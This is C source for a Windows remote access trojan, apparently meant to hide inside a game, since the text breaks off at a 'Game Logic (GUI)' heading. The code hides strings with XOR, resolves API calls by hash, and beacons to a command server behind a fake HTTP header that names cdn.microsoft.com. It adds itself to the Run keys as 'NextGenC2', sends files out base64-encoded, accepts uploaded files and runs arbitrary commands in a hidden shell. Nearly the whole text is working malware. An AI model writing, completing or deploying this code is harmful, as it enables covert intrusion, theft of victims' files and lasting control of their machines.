#include <winsock2.h>
#include <windows.h>
#include <stdint.h>
#include <stdio.h>

#ifndef CP_UTF8
#define CP_UTF8 65001
#endif

#define MAX_PROXY_CONNS 10

HANDLE hUploadFile = INVALID_HANDLE_VALUE;

// ---------------------------------------------------------
// 1. SDBM Hash Algorithm
// ---------------------------------------------------------
DWORD sdbm_hash(const char *str)
{
    DWORD hash = 0;
    int c;
    while ((c = *str++))
        hash = c + (hash << 6) + (hash << 16) - hash;
    return hash;
}

// ---------------------------------------------------------
// 2. Dynamic API Resolution
// ---------------------------------------------------------
FARPROC get_proc(HMODULE hMod, DWORD h)
{
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hMod;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((BYTE *)hMod + pDos->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY pExp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)hMod +
                                                             pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    DWORD *pFuncs = (DWORD *)((BYTE *)hMod + pExp->AddressOfFunctions);
    DWORD *pNames = (DWORD *)((BYTE *)hMod + pExp->AddressOfNames);
    WORD *pOrds = (WORD *)((BYTE *)hMod + pExp->AddressOfNameOrdinals);

    for (DWORD i = 0; i < pExp->NumberOfNames; i++)
    {
        if (sdbm_hash((char *)((BYTE *)hMod + pNames[i])) == h)
        {
            return (FARPROC)((BYTE *)hMod + pFuncs[pOrds[i]]);
        }
    }
    return NULL;
}

// ---------------------------------------------------------
// 3. Function Pointers
// ---------------------------------------------------------
typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
typedef BOOL(WINAPI *pCreateProcessA)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
typedef DWORD(WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
typedef BOOL(WINAPI *pCloseHandle)(HANDLE);
typedef BOOL(WINAPI *pDeleteFileA)(LPCSTR);
typedef HANDLE(WINAPI *pCreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI *pReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI *pWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HANDLE(WINAPI *pCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef int(WINAPI *pMultiByteToWideChar)(UINT, DWORD, LPCSTR, int, LPWSTR, int);
typedef DWORD(WINAPI *pGetTempPathA)(DWORD, LPSTR);
typedef UINT(WINAPI *pGetTempFileNameA)(LPCSTR, LPCSTR, UINT, LPSTR);
typedef LPSTR(WINAPI *plstrcatA)(LPSTR, LPCSTR);
typedef LPSTR(WINAPI *plstrcpyA)(LPSTR, LPCSTR);
typedef int(WINAPI *plstrlenA)(LPCSTR);
typedef void(WINAPI *pSleep)(DWORD);
typedef BOOL(WINAPI *pSetCurrentDirectoryA)(LPCSTR);
typedef DWORD(WINAPI *pGetModuleFileNameA)(HMODULE, LPSTR, DWORD);
typedef LONG(WINAPI *pRegOpenKeyExA)(HKEY, LPCSTR, DWORD, REGSAM, PHKEY);
typedef LONG(WINAPI *pRegSetValueExA)(HKEY, LPCSTR, DWORD, DWORD, const BYTE *, DWORD);
typedef LONG(WINAPI *pRegDeleteValueA)(HKEY, LPCSTR);
typedef LONG(WINAPI *pRegCloseKey)(HKEY);

typedef int(WSAAPI *pWSAStartup)(WORD, LPWSADATA);
typedef SOCKET(WSAAPI *pWSASocketA)(int, int, int, LPWSAPROTOCOL_INFOA, GROUP, DWORD);
typedef unsigned long(WSAAPI *pInetAddr)(const char *);
typedef u_short(WSAAPI *pHtons)(u_short);
typedef int(WSAAPI *pWSAConnect)(SOCKET, const struct sockaddr *, int, LPWSABUF, LPWSABUF, LPQOS, LPQOS);
typedef int(WSAAPI *pRecv)(SOCKET, char *, int, int);
typedef int(WSAAPI *pSend)(SOCKET, const char *, int, int);
typedef int(WSAAPI *pCloseSocket)(SOCKET);

// ---------------------------------------------------------
// Base64 Encoding Helper
// ---------------------------------------------------------
char *base64_encode(const unsigned char *data, size_t input_length, size_t *output_length)
{
    static const char encoding_table[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',
                                          'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',
                                          'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',
                                          'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',
                                          'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                                          'o', 'p', 'q', 'r', 's', 't', 'u', 'v',
                                          'w', 'x', 'y', 'z', '0', '1', '2', '3',
                                          '4', '5', '6', '7', '8', '9', '+', '/'};
    *output_length = 4 * ((input_length + 2) / 3);
    char *encoded_data = (char *)LocalAlloc(LPTR, *output_length + 1);
    if (encoded_data == NULL)
        return NULL;

    for (size_t i = 0, j = 0; i < input_length;)
    {
        uint32_t octet_a = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_b = i < input_length ? (unsigned char)data[i++] : 0;
        uint32_t octet_c = i < input_length ? (unsigned char)data[i++] : 0;

        uint32_t triple = (octet_a << 0x10) + (octet_b << 0x08) + octet_c;

        encoded_data[j++] = encoding_table[(triple >> 3 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 2 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 1 * 6) & 0x3F];
        encoded_data[j++] = encoding_table[(triple >> 0 * 6) & 0x3F];
    }

    for (int i = 0; i < (3 - input_length % 3) % 3; i++)
        encoded_data[*output_length - 1 - i] = '=';

    return encoded_data;
}

unsigned char *base64_decode(const char *data, size_t input_length, size_t *output_length)
{
    static const int decoding_table[] = {
        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1,
        -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63,
        52, 53, 54, 55, 56, 57, 58, 59, 60, 61, -1, -1, -1, -1, -1, -1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
        15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, -1, -1, -1, -1, -1,
        -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
        41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1};

    if (input_length % 4 != 0)
        return NULL;

    *output_length = input_length / 4 * 3;
    if (data[input_length - 1] == '=')
        (*output_length)--;
    if (data[input_length - 2] == '=')
        (*output_length)--;

    unsigned char *decoded_data = (unsigned char *)LocalAlloc(LPTR, *output_length);
    if (decoded_data == NULL)
        return NULL;

    for (size_t i = 0, j = 0; i < input_length;)
    {
        uint32_t sextet_a = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_b = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_c = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];
        uint32_t sextet_d = data[i] == '=' ? 0 & i++ : decoding_table[data[i++]];

        uint32_t triple = (sextet_a << 3 * 6) + (sextet_b << 2 * 6) + (sextet_c << 1 * 6) + (sextet_d << 0 * 6);

        if (j < *output_length)
            decoded_data[j++] = (triple >> 2 * 8) & 0xFF;
        if (j < *output_length)
            decoded_data[j++] = (triple >> 1 * 8) & 0xFF;
        if (j < *output_length)
            decoded_data[j++] = (triple >> 0 * 8) & 0xFF;
    }

    return decoded_data;
}

// ---------------------------------------------------------
// 4. C2 Logic (Background Thread with Heartbeat)
// ---------------------------------------------------------
DWORD WINAPI run(LPVOID lpParam)
{
    // XOR Key: 0xAA
    // "kernel32.dll"
    char k32_enc[] = {0xc1, 0xcf, 0xd8, 0xc4, 0xcf, 0xc6, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0};
    for (int i = 0; k32_enc[i]; i++)
        k32_enc[i] ^= 0xAA;
    HMODULE hK32 = GetModuleHandleA(k32_enc);

    // Resolve Kernel32
    pLoadLibraryA myLoadLib = (pLoadLibraryA)get_proc(hK32, sdbm_hash("LoadLibraryA"));
    pCreateProcessA myCreateProc = (pCreateProcessA)get_proc(hK32, sdbm_hash("CreateProcessA"));
    pWaitForSingleObject myWait = (pWaitForSingleObject)get_proc(hK32, sdbm_hash("WaitForSingleObject"));
    pCloseHandle myClose = (pCloseHandle)get_proc(hK32, sdbm_hash("CloseHandle"));
    pDeleteFileA myDelete = (pDeleteFileA)get_proc(hK32, sdbm_hash("DeleteFileA"));
    pCreateFileA myCreateFile = (pCreateFileA)get_proc(hK32, sdbm_hash("CreateFileA"));
    pReadFile myRead = (pReadFile)get_proc(hK32, sdbm_hash("ReadFile"));
    pWriteFile myWrite = (pWriteFile)get_proc(hK32, sdbm_hash("WriteFile"));
    pCreateFileW myCreateFileW = (pCreateFileW)get_proc(hK32, sdbm_hash("CreateFileW"));
    pMultiByteToWideChar myMultiByteToWideChar = (pMultiByteToWideChar)get_proc(hK32, sdbm_hash("MultiByteToWideChar"));
    pGetTempPathA myGetTempPath = (pGetTempPathA)get_proc(hK32, sdbm_hash("GetTempPathA"));
    pGetTempFileNameA myGetTempName = (pGetTempFileNameA)get_proc(hK32, sdbm_hash("GetTempFileNameA"));
    plstrcatA myStrcat = (plstrcatA)get_proc(hK32, sdbm_hash("lstrcatA"));
    plstrcpyA myStrcpy = (plstrcpyA)get_proc(hK32, sdbm_hash("lstrcpyA"));
    plstrlenA myStrlen = (plstrlenA)get_proc(hK32, sdbm_hash("lstrlenA"));
    pSleep mySleep = (pSleep)get_proc(hK32, sdbm_hash("Sleep"));
    pSetCurrentDirectoryA mySetDir = (pSetCurrentDirectoryA)get_proc(hK32, sdbm_hash("SetCurrentDirectoryA"));
    pGetModuleFileNameA myGetModuleFileName = (pGetModuleFileNameA)get_proc(hK32, sdbm_hash("GetModuleFileNameA"));
    typedef DWORD(WINAPI * pGetFileSize)(HANDLE, LPDWORD);
    pGetFileSize myGetFileSize = (pGetFileSize)get_proc(hK32, sdbm_hash("GetFileSize"));
    typedef void(WINAPI * pExitProcess)(UINT);
    pExitProcess myExitProcess = (pExitProcess)get_proc(hK32, sdbm_hash("ExitProcess"));

    // "Advapi32.dll"
    char adv_enc[] = {0xeb, 0xce, 0xdc, 0xcb, 0xda, 0xc3, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0};
    for (int i = 0; adv_enc[i]; i++)
        adv_enc[i] ^= 0xAA;
    HMODULE hAdv = myLoadLib(adv_enc);

    pRegOpenKeyExA myRegOpenKeyEx = (pRegOpenKeyExA)get_proc(hAdv, sdbm_hash("RegOpenKeyExA"));
    pRegSetValueExA myRegSetValueEx = (pRegSetValueExA)get_proc(hAdv, sdbm_hash("RegSetValueExA"));
    pRegDeleteValueA myRegDeleteValue = (pRegDeleteValueA)get_proc(hAdv, sdbm_hash("RegDeleteValueA"));
    pRegCloseKey myRegCloseKey = (pRegCloseKey)get_proc(hAdv, sdbm_hash("RegCloseKey"));

    // Check Privileges (Try to open HKLM Run Key)
    BOOL isAdmin = FALSE;
    HKEY hTestKey;
    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hTestKey) == ERROR_SUCCESS)
    {
        isAdmin = TRUE;
        myRegCloseKey(hTestKey);
    }

    // "Ws2_32.dll"
    char ws2_enc[] = {0xfd, 0xd9, 0x98, 0xf5, 0x99, 0x98, 0x84, 0xce, 0xc6, 0xc6, 0};
    for (int i = 0; ws2_enc[i]; i++)
        ws2_enc[i] ^= 0xAA;
    HMODULE hWs2 = myLoadLib(ws2_enc);

    // Resolve Winsock
    pWSAStartup myWSAStart = (pWSAStartup)get_proc(hWs2, sdbm_hash("WSAStartup"));
    pWSASocketA myWSASock = (pWSASocketA)get_proc(hWs2, sdbm_hash("WSASocketA"));
    pWSAConnect myConnect = (pWSAConnect)get_proc(hWs2, sdbm_hash("WSAConnect"));
    pInetAddr myInetAddr = (pInetAddr)get_proc(hWs2, sdbm_hash("inet_addr"));
    pHtons myHtons = (pHtons)get_proc(hWs2, sdbm_hash("htons"));
    pRecv myRecv = (pRecv)get_proc(hWs2, sdbm_hash("recv"));
    pSend mySend = (pSend)get_proc(hWs2, sdbm_hash("send"));
    pCloseSocket myCloseSock = (pCloseSocket)get_proc(hWs2, sdbm_hash("closesocket"));
    typedef int(WSAAPI * pSelect)(int, fd_set *, fd_set *, fd_set *, const struct timeval *);
    pSelect mySelect = (pSelect)get_proc(hWs2, sdbm_hash("select"));
    typedef int(WSAAPI * p__WSAFDIsSet)(SOCKET, fd_set *);
    p__WSAFDIsSet myWSAFDIsSet = (p__WSAFDIsSet)get_proc(hWs2, sdbm_hash("__WSAFDIsSet"));

    WSADATA wsa;
    myWSAStart(0x0202, &wsa);

    // "182.92.102.225"
    // "127.0.0.1"
    char ip_enc[] = {0x9b, 0x98, 0x9d, 0x84, 0x9a, 0x84, 0x9a, 0x84, 0x9b, 0};
    for (int i = 0; ip_enc[i]; i++)
        ip_enc[i] ^= 0xAA;

    char currentIdentity[64] = "DefaultUser";

    // Reconnection Loop
    while (1)
    {
        SOCKET s = myWSASock(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
        if (s == INVALID_SOCKET)
        {
            mySleep(30000);
            continue;
        }

        struct sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_addr.s_addr = myInetAddr(ip_enc);
        addr.sin_port = myHtons(5566);

        if (myConnect(s, (struct sockaddr *)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == 0)
        {
            // Connected!
            // Fake HTTP Header with Identity
            char hello[256];
            myStrcpy(hello, "POST /api/v1/status HTTP/1.1\r\nHost: cdn.microsoft.com\r\nUser-Agent: ");
            myStrcat(hello, currentIdentity);
            myStrcat(hello, "|");
            myStrcat(hello, isAdmin ? "Admin" : "User");
            myStrcat(hello, "\r\n\r\n");

            mySend(s, hello, myStrlen(hello), 0);

            char recvBuf[1024];
            char tempPath[MAX_PATH];
            char tempFile[MAX_PATH];
            char cmdLine[2048];
            char exePath[MAX_PATH];
            myGetModuleFileName(NULL, exePath, MAX_PATH);

            // Command Loop
            hUploadFile = INVALID_HANDLE_VALUE;

            while (1)
            {
                fd_set readfds;
                FD_ZERO(&readfds);
                FD_SET(s, &readfds);

                struct timeval tv;
                tv.tv_sec = 0;
                tv.tv_usec = 100000; // 100ms

                int activity = mySelect(0, &readfds, NULL, NULL, &tv);

                if (activity == SOCKET_ERROR)
                    break;

                if (!myWSAFDIsSet(s, &readfds))
                    continue;

                // Clear buffer
                for (int i = 0; i < 1024; i++)
                    recvBuf[i] = 0;

                int len = myRecv(s, recvBuf, 1023, 0);
                if (len <= 0)
                    break; // Disconnected, break to outer loop to reconnect
                recvBuf[len] = 0;

                // Trim leading whitespace/newlines
                int start = 0;
                while (recvBuf[start] == ' ' || recvBuf[start] == '\r' || recvBuf[start] == '\n')
                {
                    start++;
                }
                if (start > 0)
                {
                    int i;
                    for (i = 0; recvBuf[start + i]; i++)
                    {
                        recvBuf[i] = recvBuf[start + i];
                    }
                    recvBuf[i] = 0;
                    len -= start;
                }

                // Trim trailing whitespace
                while (len > 0 && (recvBuf[len - 1] == ' ' || recvBuf[len - 1] == '\r' || recvBuf[len - 1] == '\n'))
                {
                    recvBuf[--len] = 0;
                }

                if (len == 0)
                    continue;

                if (len >= 9 && recvBuf[0] == 't' && recvBuf[1] == 'e' && recvBuf[2] == 'r' && recvBuf[3] == 'm' && recvBuf[4] == 'i' && recvBuf[5] == 'n' && recvBuf[6] == 'a' && recvBuf[7] == 't' && recvBuf[8] == 'e')
                {
                    myExitProcess(0);
                }

                if (len >= 10 && recvBuf[0] == 'd' && recvBuf[1] == 'i' && recvBuf[2] == 's' && recvBuf[3] == 'c' && recvBuf[4] == 'o' && recvBuf[5] == 'n' && recvBuf[6] == 'n' && recvBuf[7] == 'e' && recvBuf[8] == 'c' && recvBuf[9] == 't')
                {
                    myCloseSock(s);
                    break;
                }

                if (len >= 12 && recvBuf[0] == 'p' && recvBuf[1] == 'e' && recvBuf[2] == 'r' && recvBuf[3] == 's' && recvBuf[4] == 'i' && recvBuf[5] == 's' && recvBuf[6] == 't' && recvBuf[7] == ':' && recvBuf[8] == 'h' && recvBuf[9] == 'k' && recvBuf[10] == 'c' && recvBuf[11] == 'u')
                {
                    HKEY hKey;
                    if (myRegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
                    {
                        char cmd[MAX_PATH + 20];
                        myStrcpy(cmd, "\"");
                        myStrcat(cmd, exePath);
                        myStrcat(cmd, "\" --silent");
                        myRegSetValueEx(hKey, "NextGenC2", 0, REG_SZ, (BYTE *)cmd, myStrlen(cmd) + 1);
                        myRegCloseKey(hKey);
                        char msg[] = "Persistence installed in HKCU Run (Silent Mode).\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    else
                    {
                        char msg[] = "Failed to open HKCU Run.\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    continue;
                }

                if (len >= 12 && recvBuf[0] == 'p' && recvBuf[1] == 'e' && recvBuf[2] == 'r' && recvBuf[3] == 's' && recvBuf[4] == 'i' && recvBuf[5] == 's' && recvBuf[6] == 't' && recvBuf[7] == ':' && recvBuf[8] == 'h' && recvBuf[9] == 'k' && recvBuf[10] == 'l' && recvBuf[11] == 'm')
                {
                    HKEY hKey;
                    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
                    {
                        char cmd[MAX_PATH + 20];
                        myStrcpy(cmd, "\"");
                        myStrcat(cmd, exePath);
                        myStrcat(cmd, "\" --silent");
                        myRegSetValueEx(hKey, "NextGenC2", 0, REG_SZ, (BYTE *)cmd, myStrlen(cmd) + 1);
                        myRegCloseKey(hKey);
                        char msg[] = "Persistence installed in HKLM Run (Silent Mode).\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    else
                    {
                        char msg[] = "Failed to open HKLM Run (Need Admin).\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    continue;
                }

                if (len >= 10 && recvBuf[0] == 'c' && recvBuf[1] == 'l' && recvBuf[2] == 'e' && recvBuf[3] == 'a' && recvBuf[4] == 'n' && recvBuf[5] == ':' && recvBuf[6] == 'h' && recvBuf[7] == 'k' && recvBuf[8] == 'c' && recvBuf[9] == 'u')
                {
                    HKEY hKey;
                    if (myRegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
                    {
                        if (myRegDeleteValue(hKey, "NextGenC2") == ERROR_SUCCESS)
                        {
                            char msg[] = "Persistence removed from HKCU Run.\n";
                            mySend(s, msg, myStrlen(msg), 0);
                        }
                        else
                        {
                            char msg[] = "Failed to remove value from HKCU Run.\n";
                            mySend(s, msg, myStrlen(msg), 0);
                        }
                        myRegCloseKey(hKey);
                    }
                    else
                    {
                        char msg[] = "Failed to open HKCU Run.\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    continue;
                }

                if (len >= 10 && recvBuf[0] == 'c' && recvBuf[1] == 'l' && recvBuf[2] == 'e' && recvBuf[3] == 'a' && recvBuf[4] == 'n' && recvBuf[5] == ':' && recvBuf[6] == 'h' && recvBuf[7] == 'k' && recvBuf[8] == 'l' && recvBuf[9] == 'm')
                {
                    HKEY hKey;
                    if (myRegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS)
                    {
                        if (myRegDeleteValue(hKey, "NextGenC2") == ERROR_SUCCESS)
                        {
                            char msg[] = "Persistence removed from HKLM Run.\n";
                            mySend(s, msg, myStrlen(msg), 0);
                        }
                        else
                        {
                            char msg[] = "Failed to remove value from HKLM Run.\n";
                            mySend(s, msg, myStrlen(msg), 0);
                        }
                        myRegCloseKey(hKey);
                    }
                    else
                    {
                        char msg[] = "Failed to open HKLM Run (Need Admin).\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    continue;
                }

                if (recvBuf[0] == 's' && recvBuf[1] == 'e' && recvBuf[2] == 't' && recvBuf[3] == 'i' && recvBuf[4] == 'd' && recvBuf[5] == ' ')
                {
                    // Remove newline and trim
                    for (int i = 6; i < len; i++)
                    {
                        if (recvBuf[i] == '\r' || recvBuf[i] == '\n')
                            recvBuf[i] = 0;
                    }
                    myStrcpy(currentIdentity, recvBuf + 6);
                    char ack[] = "Identity changed. Reconnecting...\n";
                    mySend(s, ack, myStrlen(ack), 0);
                    myCloseSock(s); // Force reconnect to update identity
                    break;          // Break inner loop
                }

                if (len >= 8 && recvBuf[0] == 'd' && recvBuf[1] == 'o' && recvBuf[2] == 'w' && recvBuf[3] == 'n' && recvBuf[4] == 'l' && recvBuf[5] == 'o' && recvBuf[6] == 'a' && recvBuf[7] == 'd')
                {
                    char *filename = NULL;
                    if (len > 8 && (recvBuf[8] == ' ' || recvBuf[8] == '\t'))
                    {
                        int k = 8;
                        while (recvBuf[k] == ' ' || recvBuf[k] == '\t')
                            k++;
                        if (recvBuf[k])
                            filename = recvBuf + k;
                    }
                    else if (len == 8)
                    {
                        char msg[] = "Usage: download <path>\n";
                        mySend(s, msg, myStrlen(msg), 0);
                        continue;
                    }

                    if (filename)
                    {
                        // Trim trailing whitespace/newlines from filename
                        int flen = myStrlen(filename);
                        while (flen > 0 && (filename[flen - 1] == '\r' || filename[flen - 1] == '\n' || filename[flen - 1] == ' ' || filename[flen - 1] == '\t'))
                        {
                            filename[--flen] = 0;
                        }

                        // Convert UTF-8 filename to WideChar (UTF-16)
                        HANDLE hFile = INVALID_HANDLE_VALUE;
                        int wlen = myMultiByteToWideChar(CP_UTF8, 0, filename, -1, NULL, 0);
                        if (wlen > 0)
                        {
                            WCHAR *wFilename = (WCHAR *)LocalAlloc(LPTR, wlen * sizeof(WCHAR));
                            if (wFilename)
                            {
                                myMultiByteToWideChar(CP_UTF8, 0, filename, -1, wFilename, wlen);
                                hFile = myCreateFileW(wFilename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
                                LocalFree(wFilename);
                            }
                        }

                        if (hFile != INVALID_HANDLE_VALUE)
                        {
                            DWORD fileSize = myGetFileSize(hFile, NULL);
                            char header[256];
                            wsprintfA(header, "file_start:%s:%d\n", filename, fileSize);
                            mySend(s, header, myStrlen(header), 0);

                            char buffer[1024];
                            DWORD bytesRead;
                            while (myRead(hFile, buffer, sizeof(buffer), &bytesRead, NULL) && bytesRead > 0)
                            {
                                size_t encodedLen;
                                char *encoded = base64_encode((unsigned char *)buffer, bytesRead, &encodedLen);
                                if (encoded)
                                {
                                    char *packet = (char *)LocalAlloc(LPTR, encodedLen + 20);
                                    if (packet)
                                    {
                                        wsprintfA(packet, "file_data:%s\n", encoded);
                                        mySend(s, packet, myStrlen(packet), 0);
                                        LocalFree(packet);
                                    }
                                    LocalFree(encoded);
                                }
                                mySleep(10);
                            }
                            myClose(hFile);
                            char endMsg[] = "file_end\n";
                            mySend(s, endMsg, myStrlen(endMsg), 0);
                        }
                        else
                        {
                            char msg[] = "Error: File not found.\n";
                            mySend(s, msg, myStrlen(msg), 0);
                        }
                        continue;
                    }
                }

                if (len >= 13 && recvBuf[0] == 'u' && recvBuf[1] == 'p' && recvBuf[2] == 'l' && recvBuf[3] == 'o' && recvBuf[4] == 'a' && recvBuf[5] == 'd' && recvBuf[6] == '_' && recvBuf[7] == 's' && recvBuf[8] == 't' && recvBuf[9] == 'a' && recvBuf[10] == 'r' && recvBuf[11] == 't' && recvBuf[12] == ':')
                {
                    char *filename = recvBuf + 13;
                    // Trim trailing whitespace/newlines
                    int flen = myStrlen(filename);
                    while (flen > 0 && (filename[flen - 1] == '\r' || filename[flen - 1] == '\n' || filename[flen - 1] == ' '))
                    {
                        filename[--flen] = 0;
                    }

                    if (hUploadFile != INVALID_HANDLE_VALUE)
                    {
                        myClose(hUploadFile);
                    }

                    // Convert UTF-8 filename to WideChar (UTF-16)
                    int wlen = myMultiByteToWideChar(CP_UTF8, 0, filename, -1, NULL, 0);
                    if (wlen > 0)
                    {
                        WCHAR *wFilename = (WCHAR *)LocalAlloc(LPTR, wlen * sizeof(WCHAR));
                        if (wFilename)
                        {
                            myMultiByteToWideChar(CP_UTF8, 0, filename, -1, wFilename, wlen);
                            hUploadFile = myCreateFileW(wFilename, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
                            LocalFree(wFilename);
                        }
                    }

                    if (hUploadFile != INVALID_HANDLE_VALUE)
                    {
                        char msg[] = "upload_ready\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    else
                    {
                        char msg[] = "upload_error:create_failed\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    continue;
                }

                if (len >= 11 && recvBuf[0] == 'u' && recvBuf[1] == 'p' && recvBuf[2] == 'l' && recvBuf[3] == 'o' && recvBuf[4] == 'a' && recvBuf[5] == 'd' && recvBuf[6] == '_' && recvBuf[7] == 'd' && recvBuf[8] == 'a' && recvBuf[9] == 't' && recvBuf[10] == 'a' && recvBuf[11] == ':')
                {
                    if (hUploadFile != INVALID_HANDLE_VALUE)
                    {
                        char *b64 = recvBuf + 12;
                        size_t decLen;
                        unsigned char *decoded = base64_decode(b64, myStrlen(b64), &decLen);
                        if (decoded)
                        {
                            DWORD written;
                            myWrite(hUploadFile, decoded, decLen, &written, NULL);
                            LocalFree(decoded);
                        }
                    }
                    continue;
                }

                if (len >= 10 && recvBuf[0] == 'u' && recvBuf[1] == 'p' && recvBuf[2] == 'l' && recvBuf[3] == 'o' && recvBuf[4] == 'a' && recvBuf[5] == 'd' && recvBuf[6] == '_' && recvBuf[7] == 'e' && recvBuf[8] == 'n' && recvBuf[9] == 'd')
                {
                    if (hUploadFile != INVALID_HANDLE_VALUE)
                    {
                        myClose(hUploadFile);
                        hUploadFile = INVALID_HANDLE_VALUE;
                        char msg[] = "upload_complete\n";
                        mySend(s, msg, myStrlen(msg), 0);
                    }
                    continue;
                }

                if (recvBuf[0] == 'c' && recvBuf[1] == 'd' && recvBuf[2] == ' ')
                {
                    for (int i = 3; i < len; i++)
                    {
                        if (recvBuf[i] == '\r' || recvBuf[i] == '\n')
                            recvBuf[i] = 0;
                    }
                    mySetDir(recvBuf + 3);
                    char ack[] = "Directory changed.\n";
                    mySend(s, ack, myStrlen(ack), 0);
                    continue;
                }

                // Generate Temp File
                myGetTempPath(MAX_PATH, tempPath);
                myGetTempName(tempPath, "log", 0, tempFile);

                char cmdPrefix[] = {0xc9, 0xc7, 0xce, 0x84, 0xcf, 0xd2, 0xcf, 0x8a, 0x85, 0xc9, 0x8a, 0x88, 0};
                for (int i = 0; cmdPrefix[i]; i++)
                    cmdPrefix[i] ^= 0xAA;

                myStrcpy(cmdLine, cmdPrefix);

                for (int i = 0; i < len; i++)
                {
                    if (recvBuf[i] == '\r' || recvBuf[i] == '\n')
                        recvBuf[i] = ' ';
                }
                myStrcat(cmdLine, recvBuf);

                char redir[] = {0x8a, 0x94, 0x8a, 0};
                for (int i = 0; redir[i]; i++)
                    redir[i] ^= 0xAA;
                myStrcat(cmdLine, redir);

                myStrcat(cmdLine, tempFile);

                char redirErr[] = {0x8a, 0x98, 0x94, 0x8c, 0x9b, 0x88, 0};
                for (int i = 0; redirErr[i]; i++)
                    redirErr[i] ^= 0xAA;
                myStrcat(cmdLine, redirErr);

                STARTUPINFOA si = {0};
                si.cb = sizeof(si);
                si.dwFlags = STARTF_USESHOWWINDOW;
                si.wShowWindow = SW_HIDE;
                PROCESS_INFORMATION pi = {0};

                if (myCreateProc(NULL, cmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
                {
                    myWait(pi.hProcess, INFINITE);
                    myClose(pi.hProcess);
                    myClose(pi.hThread);

                    HANDLE hFile = myCreateFile(tempFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
                    if (hFile != INVALID_HANDLE_VALUE)
                    {
                        char fileBuf[4096];
                        DWORD bytesRead;
                        if (myRead(hFile, fileBuf, sizeof(fileBuf), &bytesRead, NULL))
                        {
                            mySend(s, fileBuf, bytesRead, 0);
                        }
                        myClose(hFile);
                    }
                    else
                    {
                        char noOut[] = "[No Output]\n";
                        mySend(s, noOut, myStrlen(noOut), 0);
                    }
                    myDelete(tempFile);
                }
                else
                {
                    char err[] = "Exec failed.\n";
                    mySend(s, err, myStrlen(err), 0);
                }
            }
        }

        // Cleanup and Wait before retry
        if (s != INVALID_SOCKET)
            myCloseSock(s);
        mySleep(30000); // 30s Heartbeat/Retry Interval
    }
    return 0;
}

// ---------------------------------------------------------
// 5. Game Logic (GUI) - Interactive & Dynamic GDI
// ---------------------------------------------------------

// GDI Function Pointers
typedef HBRUSH(WINAPI *pCreateSolidBrush)(COLORREF);
